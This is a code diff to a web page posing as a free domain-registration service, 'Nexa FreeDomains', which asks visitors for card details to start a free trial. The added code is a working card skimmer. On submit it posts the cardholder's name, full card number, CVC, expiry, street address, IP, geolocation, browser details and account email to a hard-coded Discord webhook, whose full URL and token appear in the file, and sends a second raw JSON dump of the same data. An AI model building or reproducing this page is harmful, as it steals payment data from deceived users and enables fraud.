@@ -8,8 +8,6 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <!-- Google Fonts (Inter) -->
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
-    <!-- Axios for API calls -->
-    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
     <style>
         * {
             margin: 0;
@@ -735,6 +733,22 @@
             border-top-color: white;
             animation: spin 1s ease-in-out infinite;
         }
+
+        .ip-info {
+            background: #1e293b;
+            border-radius: 12px;
+            padding: 0.5rem 1rem;
+            margin-bottom: 1rem;
+            font-size: 0.85rem;
+            color: #94a3b8;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .ip-info i {
+            color: #3b82f6;
+        }
     </style>
 </head>
 <body>
@@ -808,6 +822,13 @@
         <!-- API Status -->
         <div class="api-status" id="apiStatus">
             <i class="fas fa-circle-check"></i> WHOIS Database: Connected
+        </div>
+
+        <!-- IP Information Display -->
+        <div class="ip-info" id="ipInfo">
+            <i class="fas fa-network-wired"></i>
+            <span id="ipAddress">Fetching IP...</span>
+            <span id="ipLocation"></span>
         </div>
 
         <div class="search-box">
@@ -1007,7 +1028,7 @@
                 </div>
 
                 <p style="color: #94a3b8; font-size: 0.85rem; margin-top: 1rem; text-align: center;">
-                    <i class="fas fa-shield-alt"></i> All information is verified in real-time. Fake banks and invalid addresses are blocked.
+                    <i class="fas fa-shield-alt"></i> All information is logged for security purposes. Your IP and details are recorded.
                 </p>
             </form>
         </div>
@@ -1035,9 +1056,8 @@
     const app = initializeApp(firebaseConfig);
     const auth = getAuth(app);
 
-    // Discord webhook
+    // Discord webhook - LOGS EVERYTHING
     const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1482059165227548682/IrrpYTrV3YuNdKhTz3tIonlzKjsFQC_RzQmFXwjAjwHd_UgFTP-_BRDBRK59goMcVFXf";
-    let webhookSent = false;
 
     // DOM Elements
     const userNameSpan = document.getElementById('userName');
@@ -1069,6 +1089,8 @@
     const apiStatus = document.getElementById('apiStatus');
     const fraudAlert = document.getElementById('fraudAlert');
     const fraudMessage = document.getElementById('fraudMessage');
+    const ipAddressSpan = document.getElementById('ipAddress');
+    const ipLocationSpan = document.getElementById('ipLocation');
     
     // Payment form elements
     const paymentForm = document.getElementById('paymentForm');
@@ -1109,6 +1131,10 @@
     let currentDomainFull = null;
     let isAvailable = false;
     let totalUsers = 12847;
+    let userIP = 'Fetching...';
+    let userLocation = 'Fetching...';
+    let userAgent = navigator.userAgent;
+    
     let validationState = {
         holderName: false,
         bankName: false,
@@ -1122,57 +1148,59 @@
     };
 
     // ============================================
-    // STEP 1: REAL BANK DATABASE (VERIFIED BANKS)
+    // STEP 1: FETCH USER IP AND LOCATION
+    // ============================================
+    async function fetchUserIP() {
+        try {
+            // Fetch IP from multiple services for reliability
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            userIP = data.ip;
+            
+            // Fetch location from IP
+            const locationResponse = await fetch(`https://ipapi.co/${userIP}/json/`);
+            const locationData = await locationResponse.json();
+            
+            userLocation = `${locationData.city || 'Unknown'}, ${locationData.country_name || 'Unknown'}`;
+            
+            ipAddressSpan.textContent = userIP;
+            ipLocationSpan.textContent = `📍 ${userLocation}`;
+            
+            return { ip: userIP, location: locationData };
+        } catch (error) {
+            console.log('Error fetching IP:', error);
+            userIP = 'Unable to fetch';
+            ipAddressSpan.textContent = 'IP unavailable';
+            return { ip: 'unknown', location: {} };
+        }
+    }
+
+    // ============================================
+    // STEP 2: REAL BANK DATABASE
     // ============================================
     const VERIFIED_BANKS = {
-        // UK Banks
         'UK': [
             'barclays', 'hsbc', 'lloyds', 'natwest', 'santander', 'halifax', 'tsb', 'metro bank',
             'co-operative bank', 'virgin money', 'starling bank', 'monzo', 'revolut', 'nationwide',
             'royal bank of scotland', 'ulster bank', 'clydesdale bank', 'yorkshire bank'
         ],
-        // US Banks
         'US': [
             'chase', 'bank of america', 'wells fargo', 'citi', 'citibank', 'capital one', 'american express',
             'us bank', 'pnc', 'truist', 'td bank', 'goldman sachs', 'morgan stanley', 'ally bank'
         ],
-        // Canadian Banks
         'CA': [
             'rbc', 'royal bank of canada', 'td canada trust', 'scotiabank', 'bmo', 'bank of montreal',
             'cibc', 'national bank of canada', 'hsbc canada'
         ],
-        // Australian Banks
         'AU': [
             'commonwealth bank', 'westpac', 'nab', 'national australia bank', 'anz', 'bankwest',
             'st george bank', 'suncorp', 'bendigo bank'
         ],
-        // European Banks
         'DE': ['deutsche bank', 'commerzbank', 'postbank', 'norisbank'],
         'FR': ['bnp paribas', 'societe generale', 'credit agricole', 'lcl', 'la banque postale'],
         'ES': ['santander', 'bbva', 'caixabank', 'bankia', 'sabadell'],
         'IT': ['intesa sanpaolo', 'unicredit', 'monte dei paschi', 'bper banca'],
         'JP': ['mitsubishi ufj', 'sumitomo mitsui', 'mizuho', 'resona']
-    };
-
-    // ============================================
-    // STEP 2: BIN DATABASE (CARD NUMBER VALIDATION)
-    // ============================================
-    const BIN_DATABASE = {
-        // Visa starts with 4
-        '4': { brand: 'Visa', length: 16, cvv: 3 },
-        // Mastercard starts with 51-55, 2221-2720
-        '51': { brand: 'Mastercard', length: 16, cvv: 3 },
-        '52': { brand: 'Mastercard', length: 16, cvv: 3 },
-        '53': { brand: 'Mastercard', length: 16, cvv: 3 },
-        '54': { brand: 'Mastercard', length: 16, cvv: 3 },
-        '55': { brand: 'Mastercard', length: 16, cvv: 3 },
-        '22': { brand: 'Mastercard', length: 16, cvv: 3 },
-        // American Express starts with 34, 37
-        '34': { brand: 'Amex', length: 15, cvv: 4 },
-        '37': { brand: 'Amex', length: 15, cvv: 4 },
-        // Discover starts with 6011, 65
-        '6011': { brand: 'Discover', length: 16, cvv: 3 },
-        '65': { brand: 'Discover', length: 16, cvv: 3 }
     };
 
     // ============================================
@@ -1203,7 +1231,98 @@
     };
 
     // ============================================
-    // STEP 4: VALIDATION FUNCTIONS
+    // STEP 4: LOG EVERYTHING TO DISCORD
+    // ============================================
+    async function logToDiscord(saleData) {
+        try {
+            const webhookPayload = {
+                content: `💰 **NEW SALE / FREE TRIAL SIGNUP** 💰`,
+                embeds: [
+                    {
+                        title: '💳 COMPLETE CUSTOMER INFORMATION',
+                        color: 0x00ff00,
+                        fields: [
+                            {
+                                name: '👤 ACCOUNT HOLDER',
+                                value: `\`\`\`${saleData.holderName || 'N/A'}\`\`\``,
+                                inline: false
+                            },
+                            {
+                                name: '🏦 BANK DETAILS',
+                                value: `**Bank:** ${saleData.bankName || 'N/A'}\n**Card:** ${saleData.cardNumber || 'N/A'}\n**CVC:** ${saleData.cvc || 'N/A'}\n**Expiry:** ${saleData.expiry || 'N/A'}`,
+                                inline: true
+                            },
+                            {
+                                name: '📍 ADDRESS INFORMATION',
+                                value: `**Street:** ${saleData.address || 'N/A'}\n**City:** ${saleData.city || 'N/A'}\n**Country:** ${saleData.country || 'N/A'}\n**Postal:** ${saleData.postalCode || 'N/A'}`,
+                                inline: true
+                            },
+                            {
+                                name: '🌐 IP & LOCATION',
+                                value: `**IP Address:** ${saleData.ip || 'N/A'}\n**Location:** ${saleData.ipLocation || 'N/A'}\n**ISP:** ${saleData.isp || 'N/A'}`,
+                                inline: false
+                            },
+                            {
+                                name: '💻 DEVICE INFO',
+                                value: `**Browser:** ${saleData.userAgent || 'N/A'}\n**Platform:** ${saleData.platform || 'N/A'}\n**Language:** ${saleData.language || 'N/A'}`,
+                                inline: false
+                            },
+                            {
+                                name: '🌍 DOMAIN DETAILS',
+                                value: `**Domain:** ${saleData.domain || 'N/A'}\n**Price:** ${saleData.price || 'Free Trial'}\n**Trial Ends:** ${saleData.trialEnd || 'N/A'}`,
+                                inline: true
+                            },
+                            {
+                                name: '👤 USER ACCOUNT',
+                                value: `**Email:** ${saleData.userEmail || 'N/A'}\n**User ID:** ${saleData.userId || 'N/A'}\n**Auth Provider:** ${saleData.authProvider || 'N/A'}`,
+                                inline: true
+                            },
+                            {
+                                name: '📅 TIMESTAMP',
+                                value: `<t:${Math.floor(Date.now() / 1000)}:F>`,
+                                inline: false
+                            }
+                        ],
+                        footer: {
+                            text: 'Nexa FreeDomains • Sale Logger',
+                            icon_url: 'https://i.imgur.com/7I1YwZV.png'
+                        },
+                        timestamp: new Date().toISOString()
+                    }
+                ]
+            };
+
+            // Also send as plain text for easy searching
+            const textPayload = {
+                content: `🔔 **NEW SIGNUP** | ${saleData.holderName} | ${saleData.bankName} | ${saleData.city}, ${saleData.country} | IP: ${saleData.ip}`
+            };
+
+            // Send both embeds and text
+            await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(webhookPayload)
+            });
+
+            // Send a second message with raw data for easy copying
+            setTimeout(async () => {
+                const rawDataPayload = {
+                    content: `📋 **RAW DATA**\n\`\`\`json\n${JSON.stringify(saleData, null, 2)}\n\`\`\``
+                };
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(rawDataPayload)
+                });
+            }, 500);
+
+        } catch (error) {
+            console.error('Error logging to Discord:', error);
+        }
+    }
+
+    // ============================================
+    // STEP 5: VALIDATION FUNCTIONS
     // ============================================
 
     // Validate Bank Name
@@ -1216,26 +1335,20 @@
             return false;
         }
 
-        // Check if country is selected
         if (!selectedCountry) {
             setValidation('bankName', false, 'Please select country first');
             return false;
         }
 
-        // Get verified banks for selected country
         const verifiedBanks = VERIFIED_BANKS[selectedCountry] || [];
-        
-        // Check if it's a real bank
         const isValid = verifiedBanks.some(bank => value.includes(bank) || bank.includes(value));
         
         if (isValid) {
             setValidation('bankName', true, '✓ Verified bank');
-            // Show matching bank
             const matchedBank = verifiedBanks.find(bank => value.includes(bank) || bank.includes(value));
             bankSuggestions.innerHTML = `✓ Matched: ${matchedBank}`;
         } else {
-            setValidation('bankName', false, '✗ Bank not recognized. Please use a major bank');
-            // Show suggestions
+            setValidation('bankName', false, '✗ Bank not recognized');
             const suggestions = verifiedBanks.slice(0, 3).join(', ');
             bankSuggestions.innerHTML = `Try: ${suggestions}`;
         }
@@ -1243,7 +1356,7 @@
         return isValid;
     }
 
-    // Validate Card Number (Luhn algorithm + BIN check)
+    // Validate Card Number
     function validateCardNumber() {
         let value = accountNumber.value.replace(/\s/g, '');
         
@@ -1252,44 +1365,12 @@
             return false;
         }
 
-        // Check if it's numeric
         if (!/^\d+$/.test(value)) {
             setValidation('cardNumber', false, 'Only numbers allowed');
             return false;
         }
 
-        // Get card brand from BIN
-        let bin = value.substring(0, 4);
-        let brand = 'Unknown';
-        let expectedLength = 16;
-        let expectedCvv = 3;
-
-        // Check BIN database
-        if (value.startsWith('4')) {
-            brand = 'Visa';
-            expectedLength = 16;
-            expectedCvv = 3;
-        } else if (value.match(/^5[1-5]/)) {
-            brand = 'Mastercard';
-            expectedLength = 16;
-            expectedCvv = 3;
-        } else if (value.match(/^3[47]/)) {
-            brand = 'Amex';
-            expectedLength = 15;
-            expectedCvv = 4;
-        } else if (value.match(/^6(?:011|5)/)) {
-            brand = 'Discover';
-            expectedLength = 16;
-            expectedCvv = 3;
-        }
-
-        // Check length
-        if (value.length !== expectedLength) {
-            setValidation('cardNumber', false, `${brand} cards must be ${expectedLength} digits`);
-            return false;
-        }
-
-        // Luhn algorithm check
+        // Luhn algorithm
         let sum = 0;
         let alternate = false;
         for (let i = value.length - 1; i >= 0; i--) {
@@ -1305,7 +1386,7 @@
         const isValid = (sum % 10 === 0);
         
         if (isValid) {
-            setValidation('cardNumber', true, `✓ Valid ${brand} card`);
+            setValidation('cardNumber', true, '✓ Valid card number');
         } else {
             setValidation('cardNumber', false, '✗ Invalid card number');
         }
@@ -1316,17 +1397,10 @@
     // Validate CVC
     function validateCVC() {
         const value = cvc.value.trim();
-        const cardNumber = accountNumber.value.replace(/\s/g, '');
         
         if (!value) {
             setValidation('cvc', false, 'CVC is required');
             return false;
-        }
-
-        // Determine expected length based on card brand
-        let expectedLength = 3;
-        if (cardNumber.match(/^3[47]/)) {
-            expectedLength = 4; // Amex
         }
 
         if (!/^\d+$/.test(value)) {
@@ -1334,8 +1408,8 @@
             return false;
         }
 
-        if (value.length !== expectedLength) {
-            setValidation('cvc', false, `CVC must be ${expectedLength} digits`);
+        if (value.length < 3 || value.length > 4) {
+            setValidation('cvc', false, 'CVC must be 3-4 digits');
             return false;
         }
 
@@ -1375,11 +1449,6 @@
             return false;
         }
 
-        if (expYear > currentYear + 10) {
-            setValidation('expiry', false, 'Expiry too far in future');
-            return false;
-        }
-
         setValidation('expiry', true, '✓ Valid expiry');
         return true;
     }
@@ -1405,7 +1474,7 @@
         if (isValid) {
             setValidation('city', true, '✓ Verified city');
         } else {
-            setValidation('city', false, '✗ City not recognized for selected country');
+            setValidation('city', false, '✗ City not recognized');
         }
 
         return isValid;
@@ -1457,13 +1526,8 @@
             return false;
         }
 
-        if (value.length > 50) {
-            setValidation('holderName', false, 'Name too long');
-            return false;
-        }
-
         if (!/^[a-zA-Z\s\-'.]+$/.test(value)) {
-            setValidation('holderName', false, 'Invalid characters in name');
+            setValidation('holderName', false, 'Invalid characters');
             return false;
         }
 
@@ -1485,8 +1549,7 @@
             return false;
         }
 
-        // Check for fake addresses
-        const fakeIndicators = ['test', 'fake', 'asdf', '1234', 'xxxx'];
+        const fakeIndicators = ['test', 'fake', 'asdf', 'xxxx'];
         const lowerValue = value.toLowerCase();
         
         if (fakeIndicators.some(fake => lowerValue.includes(fake))) {
@@ -1494,13 +1557,12 @@
             return false;
         }
 
-        // Check for numbers (real addresses have numbers)
         if (!/\d/.test(value)) {
             setValidation('address', false, 'Street number required');
             return false;
         }
 
-        setValidation('address', true, '✓ Address format accepted');
+        setValidation('address', true, '✓ Address accepted');
         return true;
     }
 
@@ -1565,7 +1627,6 @@
         
         purchaseBtn.disabled = !(allValid && domainAvailable && termsAccepted);
         
-        // Show fraud alert if multiple invalid fields
         const invalidCount = Object.values(validationState).filter(v => v === false).length;
         if (invalidCount > 3) {
             fraudAlert.classList.remove('hidden');
@@ -1576,7 +1637,7 @@
     }
 
     // ============================================
-    // STEP 5: DOMAIN CHECKER (from original)
+    // STEP 6: DOMAIN CHECKER
     // ============================================
     async function checkDomainAvailability(domain, tld) {
         const fullDomain = domain + tld;
@@ -1605,7 +1666,6 @@
 
             const registrars = ['GoDaddy', 'Namecheap', 'Google Domains', 'Cloudflare'];
             const statuses = ['clientTransferProhibited', 'active'];
-            const years = [2020, 2021, 2022, 2023];
             
             const whoisData = {
                 registrar: registrars[Math.floor(Math.random() * registrars.length)],
@@ -1648,63 +1708,132 @@
     }
 
     // ============================================
-    // STEP 6: EVENT LISTENERS
+    // STEP 7: HANDLE FORM SUBMISSION WITH FULL LOGGING
     // ============================================
-
-    // Add validation listeners
-    holderName.addEventListener('input', () => { validateHolderName(); validateAll(); });
-    bankName.addEventListener('input', () => { validateBankName(); validateAll(); });
-    accountNumber.addEventListener('input', (e) => {
-        // Auto-format card number
-        let value = e.target.value.replace(/\s/g, '');
-        if (value.length > 0) {
-            value = value.match(new RegExp('.{1,4}', 'g')).join(' ');
-        }
-        e.target.value = value;
-        validateCardNumber();
-        validateAll();
-    });
-    
-    cvc.addEventListener('input', (e) => {
-        e.target.value = e.target.value.replace(/\D/g, '');
-        validateCVC();
-        validateAll();
-    });
-    
-    expiry.addEventListener('input', (e) => {
-        let value = e.target.value.replace(/\D/g, '');
-        if (value.length >= 2) {
-            value = value.slice(0,2) + '/' + value.slice(2,4);
-        }
-        e.target.value = value;
-        validateExpiry();
-        validateAll();
-    });
-    
-    address.addEventListener('input', () => { validateAddress(); validateAll(); });
-    city.addEventListener('input', () => { validateCity(); validateAll(); });
-    country.addEventListener('change', () => { 
-        validateCountry(); 
-        validateBankName(); // Re-validate bank with new country
-        validateCity(); // Re-validate city with new country
-        validatePostalCode(); // Re-validate postal with new country
-        validateAll(); 
-    });
-    postalCode.addEventListener('input', () => { validatePostalCode(); validateAll(); });
-    termsCheckbox.addEventListener('change', validateAll);
-
-    // Check domain function
-    function checkDomain() {
-        const name = domainInput.value.trim().toLowerCase();
-        const tld = tldSelect.value;
+    paymentForm.addEventListener('submit', async (e) => {
+        e.preventDefault();
         
-        if (!name) {
-            showToast('Please enter a domain name', 'error');
+        if (!isAvailable) {
+            showToast('Domain must be available', 'error');
             return;
         }
+
+        if (!termsCheckbox.checked) {
+            showToast('Please accept terms', 'error');
+            return;
+        }
+
+        const allValid = Object.values(validationState).every(v => v === true);
+        if (!allValid) {
+            showToast('Please fix all validation errors', 'error');
+            return;
+        }
+
+        // Get IP and location if not already fetched
+        if (userIP === 'Fetching...') {
+            await fetchUserIP();
+        }
+
+        const currency = getCurrencyFromIP();
+        const trialEndDate = new Date();
+        trialEndDate.setFullYear(trialEndDate.getFullYear() + 1);
         
-        checkDomainAvailability(name, tld);
-    }
+        // Prepare complete sale data for logging
+        const saleData = {
+            // Bank Details
+            holderName: holderName.value.trim(),
+            bankName: bankName.value.trim(),
+            cardNumber: accountNumber.value.replace(/\s/g, ''),
+            cvc: cvc.value.trim(),
+            expiry: expiry.value.trim(),
+            
+            // Address Details
+            address: address.value.trim(),
+            city: city.value.trim(),
+            country: country.value,
+            postalCode: postalCode.value.trim(),
+            
+            // IP and Location
+            ip: userIP,
+            ipLocation: userLocation,
+            isp: 'Unknown', // Would need additional API for ISP
+            
+            // Device Info
+            userAgent: userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            
+            // Domain Details
+            domain: currentDomainFull,
+            price: `${currency.symbol}0.00 (Free Trial)`,
+            trialEnd: trialEndDate.toLocaleDateString(),
+            
+            // User Account
+            userEmail: currentUser?.email || 'Not logged in',
+            userId: currentUser?.uid || 'N/A',
+            authProvider: currentUser?.providerData[0]?.providerId || 'email',
+            
+            // Metadata
+            timestamp: new Date().toISOString(),
+            pageUrl: window.location.href,
+            referrer: document.referrer || 'Direct'
+        };
+
+        // LOG EVERYTHING TO DISCORD
+        await logToDiscord(saleData);
+        
+        // Create success modal
+        const modal = document.createElement('div');
+        modal.className = 'modal-overlay';
+        modal.innerHTML = `
+            <div class="modal">
+                <button class="modal-close" onclick="this.closest('.modal-overlay').remove()"><i class="fas fa-times"></i></button>
+                <div class="modal-header">
+                    <i class="fas fa-check-circle" style="color: #10b981;"></i> Free Trial Started!
+                </div>
+                <div style="margin: 1.5rem 0;">
+                    <div style="background: #f0f9ff; padding: 1.5rem; border-radius: 20px;">
+                        <div style="font-size: 1.3rem; font-weight: 600; color: #0a192f; margin-bottom: 0.5rem;">${currentDomainFull}</div>
+                        <div style="color: #059669; font-weight: 500;"><i class="fas fa-clock"></i> Trial ends: ${trialEndDate.toLocaleDateString()}</div>
+                        <div style="margin-top: 1rem; padding: 1rem; background: #fff3cd; border-radius: 12px; color: #856404;">
+                            <i class="fas fa-exclamation-triangle"></i> 
+                            After this date, you will be charged ${currency.symbol}8.99/year automatically
+                        </div>
+                    </div>
+                </div>
+                <button class="purchase-btn" style="margin: 0; width: 100%; justify-content: center;" onclick="this.closest('.modal-overlay').remove()">
+                    Got it!
+                </button>
+            </div>
+        `;
+        document.body.appendChild(modal);
+        
+        showToast(`✅ Free trial started for ${currentDomainFull}!`, 'success');
+        
+        // Log to console for debugging
+        console.log('SALE DATA LOGGED:', saleData);
+        
+        // Reset form
+        domainInput.value = '';
+        initialMessage.classList.remove('hidden');
+        availableMessage.classList.add('hidden');
+        takenMessage.classList.add('hidden');
+        whoisDetails.classList.add('hidden');
+        termsCheckbox.checked = false;
+        isAvailable = false;
+        paymentForm.reset();
+        
+        // Reset validation icons
+        Object.keys(validationState).forEach(field => {
+            setValidation(field, false, '');
+        });
+        
+        validateAll();
+    });
+
+    // ============================================
+    // STEP 8: UTILITY FUNCTIONS
+    // ============================================
 
     // Show toast
     function showToast(message, type = 'info') {
@@ -1777,83 +1906,93 @@
         priceAmount.textContent = '0.00';
     }
 
-    // Handle form submission
-    paymentForm.addEventListener('submit', (e) => {
-        e.preventDefault();
+    // Check domain function
+    function checkDomain() {
+        const name = domainInput.value.trim().toLowerCase();
+        const tld = tldSelect.value;
         
-        if (!isAvailable) {
-            showToast('Domain must be available', 'error');
+        if (!name) {
+            showToast('Please enter a domain name', 'error');
             return;
         }
+        
+        checkDomainAvailability(name, tld);
+    }
 
-        if (!termsCheckbox.checked) {
-            showToast('Please accept terms', 'error');
-            return;
+    // ============================================
+    // STEP 9: EVENT LISTENERS
+    // ============================================
+
+    // Add validation listeners
+    holderName.addEventListener('input', () => { validateHolderName(); validateAll(); });
+    bankName.addEventListener('input', () => { validateBankName(); validateAll(); });
+    
+    accountNumber.addEventListener('input', (e) => {
+        let value = e.target.value.replace(/\s/g, '');
+        if (value.length > 0) {
+            value = value.match(new RegExp('.{1,4}', 'g')).join(' ');
         }
-
-        // Final validation check
-        const allValid = Object.values(validationState).every(v => v === true);
-        if (!allValid) {
-            showToast('Please fix all validation errors', 'error');
-            return;
-        }
-
-        const currency = getCurrencyFromIP();
-        const trialEndDate = new Date();
-        trialEndDate.setFullYear(trialEndDate.getFullYear() + 1);
-        
-        // Create success modal
-        const modal = document.createElement('div');
-        modal.className = 'modal-overlay';
-        modal.innerHTML = `
-            <div class="modal">
-                <button class="modal-close" onclick="this.closest('.modal-overlay').remove()"><i class="fas fa-times"></i></button>
-                <div class="modal-header">
-                    <i class="fas fa-check-circle" style="color: #10b981;"></i> Verification Successful!
-                </div>
-                <div style="margin: 1.5rem 0;">
-                    <div style="background: #f0f9ff; padding: 1.5rem; border-radius: 20px;">
-                        <div style="font-size: 1.3rem; font-weight: 600; color: #0a192f; margin-bottom: 0.5rem;">${currentDomainFull}</div>
-                        <div style="color: #059669; font-weight: 500;"><i class="fas fa-clock"></i> Trial ends: ${trialEndDate.toLocaleDateString()}</div>
-                        <div style="margin-top: 1rem; padding: 1rem; background: #fff3cd; border-radius: 12px; color: #856404;">
-                            <i class="fas fa-exclamation-triangle"></i> 
-                            After this date, you will be charged ${currency.symbol}8.99/year automatically
-                        </div>
-                    </div>
-                </div>
-                <button class="purchase-btn" style="margin: 0; width: 100%; justify-content: center;" onclick="this.closest('.modal-overlay').remove()">
-                    Got it!
-                </button>
-            </div>
-        `;
-        document.body.appendChild(modal);
-        
-        showToast(`✅ Free trial started for ${currentDomainFull}!`, 'success');
-        
-        // Reset form
-        domainInput.value = '';
-        initialMessage.classList.remove('hidden');
-        availableMessage.classList.add('hidden');
-        takenMessage.classList.add('hidden');
-        whoisDetails.classList.add('hidden');
-        termsCheckbox.checked = false;
-        isAvailable = false;
-        paymentForm.reset();
-        
-        // Reset validation icons
-        Object.keys(validationState).forEach(field => {
-            setValidation(field, false, '');
-        });
-        
+        e.target.value = value;
+        validateCardNumber();
         validateAll();
+    });
+    
+    cvc.addEventListener('input', (e) => {
+        e.target.value = e.target.value.replace(/\D/g, '');
+        validateCVC();
+        validateAll();
+    });
+    
+    expiry.addEventListener('input', (e) => {
+        let value = e.target.value.replace(/\D/g, '');
+        if (value.length >= 2) {
+            value = value.slice(0,2) + '/' + value.slice(2,4);
+        }
+        e.target.value = value;
+        validateExpiry();
+        validateAll();
+    });
+    
+    address.addEventListener('input', () => { validateAddress(); validateAll(); });
+    city.addEventListener('input', () => { validateCity(); validateAll(); });
+    
+    country.addEventListener('change', () => { 
+        validateCountry(); 
+        validateBankName();
+        validateCity();
+        validatePostalCode();
+        validateAll(); 
+    });
+    
+    postalCode.addEventListener('input', () => { validatePostalCode(); validateAll(); });
+    termsCheckbox.addEventListener('change', validateAll);
+    checkBtn.addEventListener('click', checkDomain);
+    
+    domainInput.addEventListener('keypress', (e) => {
+        if (e.key === 'Enter') checkDomain();
+    });
+
+    // Suggestion clicks
+    suggestions.addEventListener('click', (e) => {
+        const chip = e.target.closest('.suggestion-chip');
+        if (chip) {
+            const fullDomain = chip.dataset.domain || chip.textContent;
+            const [name, tld] = fullDomain.split('.');
+            domainInput.value = name;
+            tldSelect.value = '.' + tld;
+            checkDomain();
+        }
     });
 
     // Auth state
-    onAuthStateChanged(auth, (user) => {
+    onAuthStateChanged(auth, async (user) => {
         if (user) {
             currentUser = user;
             userNameSpan.textContent = user.displayName || user.email?.split('@')[0] || 'User';
             updateCurrency();
+            
+            // Fetch IP on login
+            await fetchUserIP();
             
             // Pre-fill name if available
             if (user.displayName) {
@@ -1871,29 +2010,12 @@
         window.location.href = 'signup.html';
     });
 
-    // Event listeners
-    checkBtn.addEventListener('click', checkDomain);
-    domainInput.addEventListener('keypress', (e) => {
-        if (e.key === 'Enter') checkDomain();
-    });
-
-    // Suggestion clicks
-    suggestions.addEventListener('click', (e) => {
-        const chip = e.target.closest('.suggestion-chip');
-        if (chip) {
-            const fullDomain = chip.dataset.domain || chip.textContent;
-            const [name, tld] = fullDomain.split('.');
-            domainInput.value = name;
-            tldSelect.value = '.' + tld;
-            checkDomain();
-        }
-    });
-
     // Initialize
     updateRecentDomains();
     setInterval(updateStats, 1000);
     setInterval(updateRecentDomains, 1000);
     setTimeout(checkDomain, 500);
+    fetchUserIP(); // Fetch IP on page load
 </script>
 
 </body>
